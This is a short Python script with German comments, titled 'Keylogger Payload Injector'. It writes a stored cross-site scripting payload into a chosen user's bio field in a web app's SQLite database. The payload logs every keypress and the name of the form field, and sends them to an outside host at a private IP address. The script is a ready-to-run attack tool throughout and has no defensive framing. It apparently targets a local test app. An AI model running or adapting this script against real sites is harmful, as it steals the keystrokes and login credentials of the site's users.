#!/usr/bin/env python3
"""
Injiziert Keylogger-Payload direkt in die Datenbank
"""

import sqlite3
from pathlib import Path

# Ultra-Mini Payload (120 Zeichen)
PAYLOAD = """<script>document.addEventListener('keypress',e=>new Image().src='http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name)</script>"""

# Datenbank-Pfad
DB_PATH = Path(__file__).parent.parent / "instance" / "app.db"

print("="*80)
print("KEYLOGGER PAYLOAD INJECTOR")
print("="*80)
print(f"Datenbank: {DB_PATH}")
print(f"Payload-Länge: {len(PAYLOAD)} Zeichen")
print(f"\nPayload:\n{PAYLOAD}")
print("="*80)

# Verbindung zur Datenbank
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

# Zeige alle Benutzer
print("\nAktuelle Benutzer:")
cursor.execute("SELECT id, username, bio FROM users")
users = cursor.fetchall()
for user in users:
    bio_preview = user[2][:50] + "..." if user[2] and len(user[2]) > 50 else user[2]
    print(f"  ID: {user[0]}, Username: {user[1]}, Bio: {bio_preview}")

# Frage welcher User
print("\n" + "="*80)
user_id = input("Welche User-ID soll das Payload bekommen? (Enter = User ID 1): ").strip()
if not user_id:
    user_id = "1"

# Erst Bio löschen
cursor.execute("UPDATE users SET bio = ? WHERE id = ?", ("", user_id))
conn.commit()
print(f"✅ Bio-Feld von User {user_id} gelöscht")

# Dann Payload setzen
cursor.execute("UPDATE users SET bio = ? WHERE id = ?", (PAYLOAD, user_id))
conn.commit()

# Verifizieren
cursor.execute("SELECT username, bio FROM users WHERE id = ?", (user_id,))
result = cursor.fetchone()

print(f"\n✅ PAYLOAD INJIZIERT!")
print(f"User: {result[0]}")
print(f"Bio-Länge: {len(result[1])} Zeichen")
print(f"Bio-Inhalt:\n{result[1]}")

conn.close()

print("\n" + "="*80)
print("FERTIG! Gehen Sie jetzt zu /users und tippen Sie etwas!")
print("="*80)
